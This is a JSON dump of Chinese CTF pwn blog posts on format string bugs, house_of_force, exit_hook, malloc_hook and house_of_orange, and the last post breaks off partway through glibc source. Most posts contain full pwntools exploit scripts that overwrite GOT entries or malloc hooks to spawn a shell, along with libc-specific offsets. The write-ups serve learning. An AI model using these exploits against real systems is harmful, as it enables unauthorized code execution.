[{"title":"格式化字符串漏洞","url":"/2023/08/01/fmt/","content":"在你的内存刻上奇怪的符号\n函数原型printf (“格式化字符串”,参量… )函数的返回值是正确输出的字符的个数，如果输出失败，返回负值。参量表中参数的个数是不定的（如何实现参数的个数不定，可以参考《程序员的自我修养》这本书），可以是一个，可以是两个，三个…，也可以没有参数。printf函数的格式化字符串常见的有 %d，%f，%c，%s，%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）等等。但是有个不常见的格式化字符串 %n ，它的功能是将%n之前打印出来的字符个数，赋值给一个变量。\n除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。 注意是对应参数（这个参数是指针）的对应的地址开始起几个字节。不要觉得%lln，取的是8个字节的指针，%n取的就是4个字节的指针，取的是多少字节的指针只跟程序的位数有关，如果是32位的程序，%n取的就是4字节指针，64位取的就是8字节指针，这是因为不同位数的程序，每个参数对应的字节数是不同的。接下来写个程序看看\n//gcc -no-pie test.c -fno-stack-protector  -z execstack -o test#include &lt;stdio.h&gt;int d = 1;   //fmt1char x[] =&quot;/bin/sh&quot;int main()&#123;  int n=0;  printf(&quot;aaaaa%n\\n&quot;,&amp;n);  printf(&quot;%d\\n&quot;,n);\t\t  \t  int a=114;  printf(&quot;%d\\n&quot;,a);    char b[]=&quot;str1k3&quot;;  printf(b);  printf(&quot;\\n&quot;);    char c[256];  read(0,c,0x64);  //fmt  printf(c);  puts(x);    //fmt2  if(d==0)  &#123;   backdoor();  &#125;  return 0;&#125;int backdoor()&#123; return system(&quot;/bin/sh&quot;);&#125;\n\nStarting program: /home/str1k3/Desktop/test aaaaa5114str1k3aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaaaaaa-0xa-(nil)-(nil)-0xa-0x7c-0x6161616161616161-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x7025-0x401090-0x336b3172747320[Inferior 1 (process 14255) exited normally]\n如果我们只传入了格式化字符串而没有传入参数\n那么格式化字符串仍然会遵循着原先的逻辑，向高地址处逐个字长的输出当前栈的内容&#x2F;指针(输出的方式根据其格式化字符的不同而不同)\n这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束\npwntools已集成格式化字符串漏洞攻击方式\nfrom pwn import *p = process(&#x27;./test&#x27;)elf =ELF(&#x27;./test&#x27;)context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)def fmt1():  p.recv()  payload=fmtstr_payload(6,&#123;0x404048:0&#125;)    #把d改为0  p.sendline(payload)  p.interactive()def fmt2():  p.recv()  payload=fmtstr_payload(6,&#123;elf.got[&#x27;puts&#x27;]:elf.plt[&#x27;system&#x27;]&#125;) #把read改为system，执行/bin/sh  p.sendline(payload)  p.interactive()#fmt1()fmt2()\n下面放一道综合一点的题[SWPUCTF 2021 新生赛]NSS_printer_Ichecksec\n[*] &#x27;/home/str1k3/.cache/vmware/drag_and_drop/3CJjqN/NSS_printer&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char buf[104]; // [rsp+0h] [rbp-70h] BYREF  unsigned __int64 v4; // [rsp+68h] [rbp-8h]  v4 = __readfsqword(0x28u);  init();  while ( 1 )  &#123;    puts(&quot;======================================&quot;);    puts(&quot;=====welcone to use NSS printer!======&quot;);    printf(&quot;input what you want to say: &quot;);    read(0, buf, 0x64uLL);    printf(&quot;you said:&quot;);    printf(buf);  &#125;&#125;\n\n保护全开。存在格式化字符串漏洞，考虑内存任意写改got表。开了pie，可利用地址相对位置不变，地址后三位不变的特性绕过。最终想法是把printf改成system，然后通过手动输入&#x2F;bin&#x2F;sh来拿到shell\n用上文的测试方式：aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p可调试得：偏移：611（_start）+ 6 &#x3D; 17   #有些师傅用的这个来算基址13（canary）+ 6（偏移） &#x3D; 19（真实地址）15（__libc_start_main）+6（偏移） &#x3D; 21（真实地址）19（main）+6（偏移） &#x3D; 25（真实地址）\nfrom LibcSearcher import *from pwn import*context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./NSS_printer&#x27;)#p = remote(&#x27;node1.anna.nssctf.cn&#x27;, 28831)elf = ELF(&#x27;./NSS_printer&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)payload1 = &quot;%19$p..%21$p-%25$p&quot;p.recvuntil(&quot;input what you want to say: &quot;)p.sendline(payload1)p.recvuntil(&#x27;you said:&#x27;)canary = int(p.recv(18),16)print(&#x27;canary_addr&#x27;,hex(canary))p.recvuntil(&#x27;..&#x27;)libc_start_main = int(p.recv(14),16)-240print(&#x27;libc_start_main&#x27;,hex(libc_start_main))p.recvuntil(&#x27;-&#x27;)elf_base = int(p.recv(14),16)-0xA14  #main函数的偏移printf_addr = elf_base+elf.got[&#x27;printf&#x27;]print(&#x27;elf_base&#x27;,hex(elf_base))print(&#x27;printf_addr&#x27;,hex(printf_addr))libc = LibcSearcher(&#x27;__libc_start_main&#x27;,libc_start_main)libc_base = libc_start_main - libc.dump(&quot;__libc_start_main&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)bin_addr =  libc_base + libc.dump(&quot;str_bin_sh&quot;)print(&#x27;libc_start_main:&#x27;,hex(libc_start_main))print(&#x27;libc_base:&#x27;,hex(libc_base))print(&#x27;system_addr:&#x27;,hex(system_addr))print(&#x27;bin_addr:&#x27;,hex(bin_addr))payload = fmtstr_payload(6,&#123;printf_addr:system_addr&#125;,write_size=&#x27;short&#x27;)print(len(payload))p.recvuntil(&quot;input what you want to say: &quot;)p.sendline(payload)p.sendline(b&#x27;/bin/sh\\x00&#x27;)p.interactive()\n\n\n\n","categories":["stack"],"tags":["fmt"]},{"title":"house_of_force","url":"/2023/09/02/house-of-force/","content":"house_of_forcehouse of force的攻击原理是尝试从heap中分配一个非常大的内存，使得可以将chunk分配在高地址的libc中或者进一步让其溢出分配到低地址上的用户代码段中。\n用户申请一个chunk后系统先判断bin中是否有符合大小的chunk 如果没有再去top chunk分配\ntop chunk的分配办法是在top chunk顶部分配出一个空间 随后top chunk的位置向高地址处增加先看看chunk申请的源码\nvictim = av-&gt;top;//获取当前top chunk的地址size = chunksize (victim);//获取当前top chunk的大小if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))//MINSIZE就是堆块的最小size，32位程序为0x10，64位程序为0x20//nb为实际要获取的chunk大小(申请的大小加上MINSIZE)//判断式是为了保证top chunk有足够大小的空间来供此次申请//之所以要加上MINSIZE是因为为了确保申请完chunk后 top chunk还能保持完整的chunk结构  &#123;    remainder_size = size - nb;              //remainder_size为分配chunk后的top chunk大小    remainder = chunk_at_offset (victim, nb);//remainder为分配完后的top chunk地址    av-&gt;top = remainder;                     //更新top chunk                                             //下面两个set_head给分配出去的堆块以及分配后的top chunk设置新的size    set_head (victim, nb | PREV_INUSE |              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head (remainder, remainder_size | PREV_INUSE);    check_malloced_chunk (av, victim, nb);    void *p = chunk2mem (victim);    alloc_perturb (p, bytes);    return p;  &#125;\n要实现house of force攻击，我们需要两点，一是修改Top chunk size为非常大的数，方便我们可以进行任意大的内存分配；二是分配大内存后，Top chunk剩余size必须大于：X（我们想要在目标地址分配的chunk大小，包括头部信息）+ MINSIZE(大小为0x20)，这样才能让我们在目标地址处进一步分配X大小的chunk。\nfrom pwn import*p = process(&quot;./2heap&quot;)elf = ELF(&quot;./2heap&quot;)#libc = ELF(&quot;./libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def add(size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;You can customize the size of house here, but what about your life&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;add something to your house\\n&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;every decision you made is meaningful&#x27;)    p.sendline(str(index))def edit(index,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;It&#x27;s never too late to make changes&quot;)    p.sendline(str(index))    p.recvuntil(b&quot;something interesting here&quot;)    p.sendline(str(size))    p.sendlineafter(b&quot;Now add something&quot;,payload)def show(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))add(0x20,b&#x27;0xcafe66&#x27;)#chunk0add(0x30,b&#x27;aaaa&#x27;)#chunk1payload = cyclic(0x38)+p64(0xffffffffffffffff)debug()edit(1,len(payload),payload)#attackpause()add(0x40,b&#x27;aaaa&#x27;)#chunk3\n攻只因前\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x1bc1000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x1bc1290Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x1bc12c0Size: 0x41Top chunk | PREV_INUSEAddr: 0x1bc1300Size: 0x20d01\n攻只因后\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x1bc1000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x1bc1290Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x1bc12c0Size: 0x41Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENAAddr: 0x1bc1300Size: 0xffffffffffffffffpwndbg&gt; x/40gx 0x1bc13000x1bc1300:\t0x6161616e6161616d\t0xffffffffffffffff0x1bc1310:\t0x000000000000000a\t0x00000000000000000x1bc1320:\t0x0000000000000000\t0x00000000000000000x1bc1330:\t0x0000000000000000\t0x00000000000000000x1bc1340:\t0x0000000000000000\t0x00000000000000000x1bc1350:\t0x0000000000000000\t0x00000000000000000x1bc1360:\t0x0000000000000000\t0x00000000000000000x1bc1370:\t0x0000000000000000\t0x00000000000000000x1bc1380:\t0x0000000000000000\t0x00000000000000000x1bc1390:\t0x0000000000000000\t0x00000000000000000x1bc13a0:\t0x0000000000000000\t0x00000000000000000x1bc13b0:\t0x0000000000000000\t0x00000000000000000x1bc13c0:\t0x0000000000000000\t0x00000000000000000x1bc13d0:\t0x0000000000000000\t0x00000000000000000x1bc13e0:\t0x0000000000000000\t0x00000000000000000x1bc13f0:\t0x0000000000000000\t0x00000000000000000x1bc1400:\t0x0000000000000000\t0x00000000000000000x1bc1410:\t0x0000000000000000\t0x00000000000000000x1bc1420:\t0x0000000000000000\t0x00000000000000000x1bc1430:\t0x0000000000000000\t0x0000000000000000\n可以看到这个topchunk的size已被篡改\n下面放道题，看看该技术如何利用gyctf_2020_forcechecksec\n[*] &#x27;/var/run/vmblock-fuse/blockdir/Zf5bfF/force&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n看看add函数\nunsigned __int64 sub_A20()&#123;  const void **i; // [rsp+0h] [rbp-120h]  __int64 size; // [rsp+8h] [rbp-118h]  char s[256]; // [rsp+10h] [rbp-110h] BYREF  unsigned __int64 v4; // [rsp+118h] [rbp-8h]  v4 = __readfsqword(0x28u);  memset(s, 255, sizeof(s));  for ( i = (const void **)&amp;unk_202080; *i; ++i )    ;  if ( (char *)i - (char *)&amp;unk_202080 &gt; 39 )    exit(0);  puts(&quot;size&quot;);  read(0, nptr, 0xFuLL);  size = atol(nptr);  *i = malloc(size);   //没有限制chunk_size  if ( !*i )    exit(0);  printf(&quot;bin addr %p\\n&quot;, *i);//会打印堆地址  puts(&quot;content&quot;);  read(0, (void *)*i, 0x50uLL);//存在堆溢出，当申请的chunk_size &lt; 0x50时  puts(&quot;done&quot;);  return __readfsqword(0x28u) ^ v4;&#125;\none_gadgets\n0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL\n先打house_of_force，拿捏top_chunk同时，在分配第一个chunk时，程序还会打印出bin_addr,可以利用此泄露libc_addr\n__realloc_hook 和 __malloc_hook这两个钩子函数是相邻的，我们可以利用同一个chunk来劫持__malloc_hook为realloc+0x10，并劫持__realloc_hook为one_gadget\n再次执行malloc即可getshell\nfrom pwn import *#p = process(&#x27;./force&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,27065)libc = ELF(&quot;buu_libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size, content):    p.recvuntil(&quot;2:puts\\n&quot;)    p.sendline(&quot;1&quot;)    p.recvuntil(&quot;size\\n&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;bin addr &quot;)    info = p.recvuntil(&quot;\\n&quot;, drop=True)    # print(info)    info = int(info.decode(&quot;ISO-8859-1&quot;), 16)    p.recvuntil(&quot;content\\n&quot;)    p.send(content)    return infoone_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]libc.address = add(0x200000, &#x27;chunk0\\n&#x27;) + 0x200ff0 #gdb找偏移，leak_libc_base &amp;&amp; house_of_force拿捏topchunksuccess(&#x27;libc_base&#x27;+hex(libc.address))heap_addr = add(0x18,b&#x27;a&#x27;*0x10+p64(0)+p64(0xFFFFFFFFFFFFFFFF)) #leak_heap_addr &amp;&amp;修改topchunk的size为0xFFFFFFFFFFFFFFFFsuccess(&quot;heap_addr:&quot;+hex(heap_addr))top = heap_addr + 0x10          #leak_topchunk_addrmalloc_hook = libc.sym[&#x27;__malloc_hook&#x27;] #get_malloc_hook_addrsuccess(&quot;malloc_hook:&quot;+hex(malloc_hook))realloc = libc.sym[&quot;__libc_realloc&quot;]offset = malloc_hook - topsystem = libc.sym[&#x27;system&#x27;]bin_sh = libc.search(b&#x27;/bin/sh&#x27;)success(&quot;system:&quot; + hex(system))success(&quot;bin_sh:&quot; + str(bin_sh))#debug()#one_gadget + libc.address -&gt; 计算偏移,使topchunk落在malloc_hook处#此时申请一个chunk，就可以实现修改malloc_hook和realloc_hookadd(offset-0x30,b&#x27;aaa\\n&#x27;)add(0x30,b&#x27;a&#x27;*8+p64(one_gadget[1] + libc.address)+p64(realloc+0x10))#hijack_malloc_hook#再次执行malloc，即可getshellp.recvuntil(&quot;2:puts\\n&quot;)p.sendline(&#x27;1&#x27;)p.recvuntil(&quot;size\\n&quot;)p.sendline(str(20))p.interactive()\n\n","categories":["heap"],"tags":["bin"]},{"title":"exit_hook","url":"/2023/09/06/exit-hook/","content":"//gcc exit.c -g -no-pie -o exit#include&lt;stdio.h&gt;void main()&#123;\tprintf(&quot;str1k3\\n&quot;);\texit(0); &#125;\n看看exit\n► 0x7ffff7e08a40 &lt;exit&gt;         endbr64    0x7ffff7e08a44 &lt;exit+4&gt;       push   rax   0x7ffff7e08a45 &lt;exit+5&gt;       pop    rax   0x7ffff7e08a46 &lt;exit+6&gt;       mov    ecx, 1   0x7ffff7e08a4b &lt;exit+11&gt;      mov    edx, 1   0x7ffff7e08a50 &lt;exit+16&gt;      lea    rsi, [rip + 0x1a5cc1]         &lt;__exit_funcs&gt;   0x7ffff7e08a57 &lt;exit+23&gt;      sub    rsp, 8   0x7ffff7e08a5b &lt;exit+27&gt;      call   __run_exit_handlers                &lt;__run_exit_handlers&gt;\n跟进 __run_exit_handlers看看\n  0x7ffff7e0888a &lt;__run_exit_handlers+218&gt;    mov    rdi, qword ptr [rax + 0x20]  0x7ffff7e0888e &lt;__run_exit_handlers+222&gt;    mov    qword ptr [rax + 0x10], 0  0x7ffff7e08896 &lt;__run_exit_handlers+230&gt;    mov    esi, ebp  0x7ffff7e08898 &lt;__run_exit_handlers+232&gt;    ror    rdx, 0x11  0x7ffff7e0889c &lt;__run_exit_handlers+236&gt;    xor    rdx, qword ptr fs:[0x30]► 0x7ffff7e088a5 &lt;__run_exit_handlers+245&gt;    call   rdx                           &lt;_dl_fini&gt;\n调用了_dl_fini，接着跟进\n0x7ffff7fe0dca &lt;_dl_fini+106&gt;    lea    rdi, [rip + 0x1cb97]          &lt;_rtld_global+2312&gt;  0x7ffff7fe0dd1 &lt;_dl_fini+113&gt;    call   qword ptr [rip + 0x1d191]     &lt;rtld_lock_default_lock_recursive&gt;\n0x7ffff7fe103f &lt;_dl_fini+735&gt;    cmovne rdi, r13   0x7ffff7fe1043 &lt;_dl_fini+739&gt;    jmp    _dl_fini+366                &lt;_dl_fini+366&gt;    ↓   0x7ffff7fe0ece &lt;_dl_fini+366&gt;    xor    edx, edx   0x7ffff7fe0ed0 &lt;_dl_fini+368&gt;    mov    ecx, 1   0x7ffff7fe0ed5 &lt;_dl_fini+373&gt;    call   _dl_sort_maps                &lt;_dl_sort_maps&gt;  ► 0x7ffff7fe0eda &lt;_dl_fini+378&gt;    lea    rdi, [rip + 0x1ca87]          &lt;_rtld_global+2312&gt;   0x7ffff7fe0ee1 &lt;_dl_fini+385&gt;    call   qword ptr [rip + 0x1d089]     &lt;rtld_lock_default_unlock_recursive&gt;\nvoid_dl_fini (void)&#123;  /* Lots of fun ahead.  We have to call the destructors for all still     loaded objects, in all namespaces.  The problem is that the ELF     specification now demands that dependencies between the modules     are taken into account.  I.e., the destructor for a module is     called before the ones for any of its dependencies.     To make things more complicated, we cannot simply use the reverse     order of the constructors.  Since the user might have loaded objects     using `dlopen&#x27; there are possibly several other modules with its     dependencies to be taken into account.  Therefore we have to start     determining the order of the modules once again from the beginning.  */  /* We run the destructors of the main namespaces last.  As for the     other namespaces, we pick run the destructors in them in reverse     order of the namespace ID.  */#ifdef SHARED  int do_audit = 0; again:#endif  for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)    &#123;      /* Protect against concurrent loads and unloads.  */      __rtld_lock_lock_recursive (GL(dl_load_lock));      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;      /* No need to do anything for empty namespaces or those used for\t auditing DSOs.  */      if (nloaded == 0#ifdef SHARED\t  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit#endif\t  )\t__rtld_lock_unlock_recursive (GL(dl_load_lock));    &#125;&#125;\n放一下这两函数的定义\n# define __rtld_lock_lock_recursive(NAME) \\  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)# define __rtld_lock_unlock_recursive(NAME) \\  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)#else# define __rtld_lock_lock_recursive(NAME) \\  __libc_maybe_call (__pthread_mutex_lock, (&amp;(NAME).mutex), 0)# define __rtld_lock_unlock_recursive(NAME) \\  __libc_maybe_call (__pthread_mutex_unlock, (&amp;(NAME).mutex), 0)#endif\ngdb输入p _rtld_global可以看到结构体_rtld_global\n_dl_rtld_lock_recursive = 0x7ffff7fd0150 &lt;rtld_lock_default_lock_recursive&gt;,_dl_rtld_unlock_recursive = 0x7ffff7fd0160 &lt;rtld_lock_default_unlock_recursive&gt;,\n这俩函数是结构体_rtld_global的一部分 存在于_dl_load_lock 里，是 _rtld_global._dl_load_lock.mutex.__size的地址并且在调用之前会把某个地址里的值赋给 rdi。由于__rtld_lock_unlock_recursive存放在结构体空间，为可读可写，那么如果可以修改__rtld_lock_unlock_recursive,就可以在调用exit()时劫持程序流。_rtld_lock_lock_recursive也是一样的流程\n//在libc-2.23中exit_hook = libc_base+0x5f0040+3848exit_hook = libc_base+0x5f0040+3856//在libc-2.27中exit_hook = libc_base+0x619060+3840exit_hook = libc_base+0x619060+3848//libc-2.31exit_hook = libc_base + 0x222060 + 3848\n\n这样一来，只要知道libc版本和任意地址的写，我们可以直接写这个指针，执行exit后就可以劫持控制流了。\n任意一个改写成one_gadget都可以拿到shell\n或将任意一个改为system，将_rtld_global._dl_load_lock.mutex.__size改为&#x2F;bin&#x2F;sh\\x00也可\n","categories":["heap"],"tags":["hook"]},{"title":"malloc_hook","url":"/2023/09/07/malloc-hook/","content":"glibc2.30后增加了对malloc的检查，malloc_hook手法已经不可用直接上例题gyctf_2020_forcechecksec\n[*] &#x27;/var/run/vmblock-fuse/blockdir/Zf5bfF/force&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n看看add函数\nunsigned __int64 sub_A20()&#123;  const void **i; // [rsp+0h] [rbp-120h]  __int64 size; // [rsp+8h] [rbp-118h]  char s[256]; // [rsp+10h] [rbp-110h] BYREF  unsigned __int64 v4; // [rsp+118h] [rbp-8h]  v4 = __readfsqword(0x28u);  memset(s, 255, sizeof(s));  for ( i = (const void **)&amp;unk_202080; *i; ++i )    ;  if ( (char *)i - (char *)&amp;unk_202080 &gt; 39 )    exit(0);  puts(&quot;size&quot;);  read(0, nptr, 0xFuLL);  size = atol(nptr);  *i = malloc(size);   //没有限制chunk_size  if ( !*i )    exit(0);  printf(&quot;bin addr %p\\n&quot;, *i);//会打印堆地址  puts(&quot;content&quot;);  read(0, (void *)*i, 0x50uLL);//存在堆溢出，当申请的chunk_size &lt; 0x50时  puts(&quot;done&quot;);  return __readfsqword(0x28u) ^ v4;&#125;\none_gadgets\n0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL\n先打house_of_force，拿捏top_chunk同时，在分配第一个chunk时，程序还会打印出bin_addr,可以利用此泄露libc_addr\n__realloc_hook 和 __malloc_hook这两个钩子函数是相邻的，我们可以利用同一个chunk来劫持__malloc_hook为realloc+0x10，并劫持__realloc_hook为one_gadget\n再次执行malloc即可getshell\nfrom pwn import *#p = process(&#x27;./force&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,27065)libc = ELF(&quot;buu_libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size, content):    p.recvuntil(&quot;2:puts\\n&quot;)    p.sendline(&quot;1&quot;)    p.recvuntil(&quot;size\\n&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;bin addr &quot;)    info = p.recvuntil(&quot;\\n&quot;, drop=True)    # print(info)    info = int(info.decode(&quot;ISO-8859-1&quot;), 16)    p.recvuntil(&quot;content\\n&quot;)    p.send(content)    return infoone_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]libc.address = add(0x200000, &#x27;chunk0\\n&#x27;) + 0x200ff0 #gdb找偏移，leak_libc_base &amp;&amp; house_of_force拿捏topchunksuccess(&#x27;libc_base&#x27;+hex(libc.address))heap_addr = add(0x18,b&#x27;a&#x27;*0x10+p64(0)+p64(0xFFFFFFFFFFFFFFFF)) #leak_heap_addr &amp;&amp;修改topchunk的size为0xFFFFFFFFFFFFFFFFsuccess(&quot;heap_addr:&quot;+hex(heap_addr))top = heap_addr + 0x10          #leak_topchunk_addrmalloc_hook = libc.sym[&#x27;__malloc_hook&#x27;] #get_malloc_hook_addrsuccess(&quot;malloc_hook:&quot;+hex(malloc_hook))realloc = libc.sym[&quot;__libc_realloc&quot;]offset = malloc_hook - topsystem = libc.sym[&#x27;system&#x27;]bin_sh = libc.search(b&#x27;/bin/sh&#x27;)success(&quot;system:&quot; + hex(system))success(&quot;bin_sh:&quot; + str(bin_sh))#debug()#one_gadget + libc.address -&gt; 计算偏移,使topchunk落在malloc_hook处#此时申请一个chunk，就可以实现修改malloc_hook和realloc_hookadd(offset-0x30,b&#x27;aaa\\n&#x27;)add(0x30,b&#x27;a&#x27;*8+p64(one_gadget[1] + libc.address)+p64(realloc+0x10))#hijack_malloc_hook#再次执行malloc，即可getshellp.recvuntil(&quot;2:puts\\n&quot;)p.sendline(&#x27;1&#x27;)p.recvuntil(&quot;size\\n&quot;)p.sendline(str(20))p.interactive()","categories":["heap"],"tags":["hook"]},{"title":"house_of_orange","url":"/2023/10/01/house-of-orange/","content":"house of orange\n我们在打House of Force中使用的方法是修改Top_chunk为一个特别大的值来拿捏Top_chunk，之后申请一个特别大的chunk，循环一遍内存之后就可以访问到原本Top_chunk上方的内容\n那如果将Top_chunk修改为一个很小的值呢？\nmalloc分配内存的时候实际上更底层是通过sbrk的调用拓展内存的空间的假如我们把Top_chunk修改为一个很小的数，这时再申请一个更大的chunk内存认为的Top_chunk是无法满足申请空间的需求的，因此堆管理器后续会再使用brk申请一块新的区域\n正常来说堆管理器会直接将通过brk分配的新内存直接并入到Top_chunk中（即让Top_chunk变大）但是由于我们改小了Top_chunk，堆管理器认为Top_chunk与堆的尾部并不相邻\n因此会将原本的Top_chunk Free掉\n这样一番过程下来，我们就没有通过Free函数得到了一个Free chunk根据修改的Top Chunk大小，我们可以利用这个Free Chunk来实现Unsorted bin attack\n利用Unsorted bin attack结合伪造IO_file就可以劫持程序执行流\n需要伪造的是这段,目标是触发_overflow函数\npwndbg&gt; dt FILEFILE    +0x0000 _flags               : int    +0x0008 _IO_read_ptr         : char *    +0x0010 _IO_read_end         : char *    +0x0018 _IO_read_base        : char *    +0x0020 _IO_write_base       : char *    +0x0028 _IO_write_ptr        : char *    +0x0030 _IO_write_end        : char *    +0x0038 _IO_buf_base         : char *    +0x0040 _IO_buf_end          : char *    +0x0048 _IO_save_base        : char *    +0x0050 _IO_backup_base      : char *    +0x0058 _IO_save_end         : char *    +0x0060 _markers             : struct _IO_marker *    +0x0068 _chain               : struct _IO_FILE *    +0x0070 _fileno              : int    +0x0074 _flags2              : int    +0x0078 _old_offset          : __off_t    +0x0080 _cur_column          : short unsigned int    +0x0082 _vtable_offset       : signed char    +0x0083 _shortbuf            : char [1]    +0x0088 _lock                : _IO_lock_t *    +0x0090 _offset              : __off64_t    +0x0098 _codecvt             : struct _IO_codecvt *    +0x00a0 _wide_data           : struct _IO_wide_data *    +0x00a8 _freeres_list        : struct _IO_FILE *    +0x00b0 _freeres_buf         : void *    +0x00b8 __pad5               : size_t    +0x00c0 _mode                : int    +0x00c4 _unused2             : char [20]\npwndbg&gt; p *_IO_list_all$1 = &#123;  file = &#123;    _flags = -72540025,     _IO_read_ptr = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_read_end = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_read_base = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_write_base = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_write_ptr = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_write_end = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_buf_base = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_buf_end = 0x7f0b81d6d704 &lt;_IO_2_1_stderr_+132&gt; &quot;&quot;,     _IO_save_base = 0x0,     _IO_backup_base = 0x0,     _IO_save_end = 0x0,     _markers = 0x0,     _chain = 0x7f0b81d6d760 &lt;_IO_2_1_stdout_&gt;,     _fileno = 2,     _flags2 = 0,     _old_offset = -1,     _cur_column = 0,     _vtable_offset = 0 &#x27;\\000&#x27;,     _shortbuf = &quot;&quot;,     _lock = 0x7f0b81d6e8b0 &lt;_IO_stdfile_2_lock&gt;,     _offset = -1,     _codecvt = 0x0,     _wide_data = 0x7f0b81d6c780 &lt;_IO_wide_data_2&gt;,     _freeres_list = 0x0,     _freeres_buf = 0x0,     __pad5 = 0,     _mode = 0,     _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt;  &#125;,   vtable = 0x7f0b81d692a0 &lt;_IO_file_jumps&gt;&#125;\n还是放段源码吧\nstruct _IO_FILE &#123;int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags   /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;   /* Current read pointer */  char* _IO_read_end;   /* End of get area. */  char* _IO_read_base;  /* Start of putback+get area. */  char* _IO_write_base; /* Start of put area. */  char* _IO_write_ptr;  /* Current put pointer. */  char* _IO_write_end;  /* End of put area. */  char* _IO_buf_base;   /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */   struct _IO_marker *_markers;   struct _IO_FILE *_chain;   int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */ #define __HAVE_COLUMN /* 